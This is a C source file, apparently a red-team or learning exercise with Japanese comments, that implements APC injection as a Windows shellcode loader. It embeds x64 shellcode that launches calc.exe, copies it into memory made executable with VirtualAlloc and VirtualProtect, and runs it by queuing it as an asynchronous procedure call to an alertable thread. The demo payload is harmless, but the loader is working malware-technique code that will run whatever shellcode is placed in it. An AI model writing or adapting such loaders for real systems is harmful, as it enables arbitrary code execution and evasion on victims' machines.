/*
APC (Asynchronous Procedure Call) Injection
*/

#include <windows.h>

#ifdef DEBUG
    #include <stdio.h>
    #define LOG(fmt, ...) printf("[DEBUG] " fmt "\n", ##__VA_ARGS__)
    // ...は可変引数
#else
    #define LOG(fmt, ...)
#endif
// gcc -DDEBUG main.c
// debug mode is enable

// Variable table

typedef unsigned long long size_t; //windows ではlongは4バイトでlong longは8バイト


const unsigned char shellcode[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xcd\x64\x9f\x68\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

DWORD old_protect;

// Function table

void* origmemcpy(void *dest, const void *src, size_t n){
    unsigned char *d = (unsigned char*)dest;
    const unsigned char *s = (const unsigned char*)src;

    for(size_t i = 0; i < n; i++){
        d[i] = s[i];   
    }

    // 結果的に同じ位置のメモリに書き込まれる
    return dest;
}

// thread sleep...
DWORD WINAPI alertWorker(LPVOID lpParameter){
    SleepEx(INFINITE, TRUE);
    return 0;
}




int local_shellcode_exec(const unsigned char *src, size_t size){
    void * mem = VirtualAlloc(
        NULL,
        size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if(mem == NULL){
        LOG("[-]VirtualAlloc Failed: %lu", GetLastError());
        return -1;
    }
    LOG("[+]VirtualAlloc succeeded: addr=%p size=%zu", mem, size);

    origmemcpy(mem, src, size);
    LOG("[+]memcpy succeeded: src=%p dst=%p size=%zu", src, mem, size);


    if(!VirtualProtect(mem, size, PAGE_EXECUTE_READ, &old_protect)){
    LOG("[-]VirtualProtect failed: %lu", GetLastError());
    goto cleanup;
    }

    LOG("[+]VirtualProtect succeeded: RW -> RX addr=%p", mem);

    LOG("[*]executing shellcode at %p", mem);
    
    HANDLE hThread = CreateThread(
        NULL,
        0,
        alertWorker,
        NULL,
        0,
        NULL
    );

    Sleep(100);

    DWORD result = QueueUserAPC(
        (PAPCFUNC)mem,// apc func [in] PAPCFUNC  pfnAPC,
        hThread,
        0// [in] ULONG_PTR dwData APC関数への引数
    );

    if(result == 0){
        LOG("[-]QueueUserAPC Failed: %lu", GetLastError());
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread); 

    LOG("[+]Done!");

    cleanup:
        if(mem)VirtualFree(mem, 0, MEM_RELEASE);
        LOG("[*]VirtualFree: addr=%p", mem);
    return 0;
}

int main(void){
    LOG("=== shellcode loader start ===");
    local_shellcode_exec(shellcode, sizeof(shellcode));
    // sizeofはsize_tを返す
    LOG("=== shellcode loader end ===");
    return 0;
}
